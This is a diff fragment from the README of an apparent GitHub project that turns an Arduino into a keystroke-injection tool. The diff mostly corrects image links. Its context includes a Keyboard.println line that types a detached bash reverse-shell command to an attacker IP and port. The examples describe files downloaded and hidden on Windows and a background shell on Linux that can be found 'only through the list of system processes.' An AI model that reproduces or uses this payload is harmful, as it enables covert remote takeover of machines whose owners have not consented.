@@ -26,13 +26,17 @@ edit rev.ps1 file and specify ip and port of your machine from which you will us
   Keyboard.println("nohup /bin/bash -c \"/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\" >/dev/null 2>&1 &; disown; exit");
   ``` 
 # Examples
-After connecting the arduino to a windows machine, the necessary files are downloaded and the hidden attribute is set to them so that they are not visible: 
-![hidden_files](https://github.com/EvtDanya/Reverse-Shell-Arduino/hidden_files.png)      
+After connecting the arduino to a windows machine, the necessary files are downloaded and the hidden attribute is set to them so that they are not visible:   
+
+![hidden_files](https://github.com/EvtDanya/Reverse-Shell-Arduino/blob/main/hidden_files.png)  
+
 And our reverse shell is launched:       
-![reverse_shell_in_windows](https://github.com/EvtDanya/Reverse-Shell-Arduino/reverse_win.png)      
+
+![reverse_shell_in_windows](https://github.com/EvtDanya/Reverse-Shell-Arduino/blob/main/reverse_win.png)      
 
 After connecting the arduino to a linux machine, a command is run in the background and it can now be detected only through the list of system processes:  
-![reverse_shell_in_linux](https://github.com/EvtDanya/Reverse-Shell-Arduino/reverse_lin.png)  
+
+![reverse_shell_in_linux](https://github.com/EvtDanya/Reverse-Shell-Arduino/blob/main/reverse_lin.png)  
 
 ## Feedback  
 If you have any questions or suggestions, please dm me https://t.me/d3f3nd3r
